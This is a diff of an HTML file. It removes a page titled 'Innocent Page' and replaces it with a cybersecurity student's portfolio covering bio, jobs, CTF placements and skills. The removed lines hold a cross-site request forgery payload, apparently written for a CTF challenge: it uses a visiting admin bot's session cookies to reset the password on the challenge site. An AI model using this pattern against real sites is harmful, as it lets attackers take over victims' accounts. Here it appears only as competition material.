@@ -1,31 +1,166 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Innocent Page</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>George Filippov | Digital Portfolio</title>
+    <link rel="stylesheet" href="style.css">
 </head>
 <body>
-    <h1>Loading...</h1>
-    
-    <script>
-        // This will execute when the admin bot visits your page
-        fetch('https://epptfkdr.web.ctf.uscybergames.com/api/change-password', {
-            method: 'PUT',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            credentials: 'include', // This is crucial - includes session cookies
-            body: JSON.stringify({
-                new_password: 'hacked123'
-            })
-        })
-        .then(response => {
-            if (response.ok) {
-                console.log('Password changed successfully');
-            }
-        })
-        .catch(error => {
-            console.error('Error:', error);
-        });
-    </script>
+    <header>
+        <div class="container">
+            <nav>
+                <a href="/" class="logo">George Filippov</a>
+                <ul class="nav-links">
+                    <li><a href="#about">About</a></li>
+                    <li><a href="#experience">Experience</a></li>
+                    <li><a href="#education">Education</a></li>
+                    <li><a href="#skills">Skills</a></li>
+                </ul>
+            </nav>
+        </div>
+    </header>
+
+    <main class="container">
+        <div class="hero">
+            <div class="hero-content">
+                <h1>George Filippov</h1>
+                <p class="title">Computer Science Student & Cybersecurity Enthusiast</p>
+                <div class="contact-info">
+                    <span>Oviedo, FL</span>
+                    <a href="mailto:geo.a.filippov@gmail.com">geo.a.filippov@gmail.com</a>
+                    <a href="https://linkedin.com/in/george-filippov/" target="_blank">LinkedIn</a>
+                    <a href="https://github.com/Cyber-Scholar" target="_blank">GitHub</a>
+                </div>
+            </div>
+        </div>
+
+        <section id="about">
+            <h2>About Me</h2>
+            <p class="about-text">
+                I am a Computer Science student at the University of Central Florida, Honors College, expected to graduate in 2029. My passion lies in cybersecurity, where I combine technical expertise with creative problem-solving to tackle complex security challenges. Through my experience as a Chief Content Engineer at Gooseberry Consulting and as a Content Developer Intern at CyberExer, I have developed specialized skills in designing cybersecurity training scenarios and CTF challenges that push the boundaries of technical education. I thrive in competitive environments, having earned multiple victories in national cybersecurity competitions, and I am constantly seeking new opportunities to learn and grow in this ever-evolving field. My background in teaching mathematics has also honed my ability to communicate complex concepts clearly and effectively.
+            </p>
+        </section>
+
+        <section id="experience">
+            <h2>Work Experience</h2>
+            
+            <div class="job">
+                <div class="job-header">
+                    <h3>Chief Content Engineer</h3>
+                    <span class="company">Gooseberry Consulting</span>
+                    <span class="date">August 2025 - Present</span>
+                </div>
+                <ul>
+                    <li>Engineered custom cybersecurity training scenarios and CTF challenges tailored to client needs</li>
+                    <li>Led a team of engineers to design technical security challenges, ensuring consistent quality and rapid deployment by standardizing development workflows</li>
+                </ul>
+            </div>
+
+            <div class="job">
+                <div class="job-header">
+                    <h3>Content Developer & Tester Intern</h3>
+                    <span class="company">CyberExer</span>
+                    <span class="date">July 2024</span>
+                </div>
+                <ul>
+                    <li>Evaluated and documented existing training environments across both Windows and Linux platforms, ensuring functionality and usability</li>
+                    <li>Developed training environments aligned with the NICE framework using Ansible for automation and configuration management</li>
+                </ul>
+            </div>
+
+            <div class="job">
+                <div class="job-header">
+                    <h3>Student Tutor</h3>
+                    <span class="company">Russian School of Mathematics (RSM)</span>
+                    <span class="date">September 2020 - August 2025</span>
+                </div>
+                <ul>
+                    <li>Provided personalized tutoring for over 100 RSM students from kindergarten through 7th grade, fostering mathematical comprehension and critical thinking skills</li>
+                    <li>Supported the execution of high-impact marketing events, each attracting over 1000 attendees, by engaging audiences and ensuring seamless event operations</li>
+                </ul>
+            </div>
+        </section>
+
+        <section id="activities">
+            <h2>Activities & Achievements</h2>
+            
+            <div class="activity">
+                <div class="activity-header">
+                    <h3>Web Exploitation Specialist</h3>
+                    <span class="org">Squid Proxy Lovers</span>
+                    <span class="date">Present</span>
+                </div>
+                <ul>
+                    <li>Top 5 CTF Team in North America</li>
+                    <li>1st Place Overall, DEFCON NoobCTF (300+ competitors): First competitor to complete the entire Web Exploitation category</li>
+                    <li>Technical Stack: BurpSuite and pwntools for custom exploit development and bypassing web security controls</li>
+                </ul>
+            </div>
+
+            <div class="activity">
+                <div class="activity-header">
+                    <h3>Collegiate Cyber Competition Team</h3>
+                    <span class="org">UCF Collegiate Cyber Defense Club</span>
+                    <span class="date">Present</span>
+                </div>
+                <ul>
+                    <li>1st Place, National 2-Division College Cyber Defense Competition: Performed rapid incident response and system hardening for a mock enterprise network</li>
+                    <li>1st Place, Alamo CTF: Led web exploitation by identifying and chaining vulnerabilities to clear high-point challenges</li>
+                    <li>2nd Place, CyberBay CTF: Achieved top individual scorer status with hybrid skill set in web and physical security</li>
+                </ul>
+            </div>
+        </section>
+
+        <section id="education">
+            <h2>Education</h2>
+            <div class="job">
+                <div class="job-header">
+                    <h3>Bachelor of Science - Computer Science</h3>
+                    <span class="company">University of Central Florida, Honors College</span>
+                    <span class="date">Expected May 2029</span>
+                </div>
+            </div>
+        </section>
+
+        <section id="skills">
+            <h2>Skills & Certifications</h2>
+            <div class="skills-grid">
+                <div class="skill-category">
+                    <h3>Certifications</h3>
+                    <ul>
+                        <li>CompTIA Net+</li>
+                        <li>CompTIA Sec+</li>
+                        <li>AWS Cloud Practitioner</li>
+                    </ul>
+                </div>
+                <div class="skill-category">
+                    <h3>Programming Languages</h3>
+                    <ul>
+                        <li>Python</li>
+                        <li>C</li>
+                        <li>Java</li>
+                        <li>SQL</li>
+                        <li>HTML/CSS</li>
+                    </ul>
+                </div>
+                <div class="skill-category">
+                    <h3>Tools & Technologies</h3>
+                    <ul>
+                        <li>BurpSuite</li>
+                        <li>pwntools</li>
+                        <li>Ansible</li>
+                        <li>Linux/Windows</li>
+                    </ul>
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <footer>
+        <div class="container">
+            <p>&copy; 2026 George Filippov. All rights reserved.</p>
+        </div>
+    </footer>
 </body>
 </html>
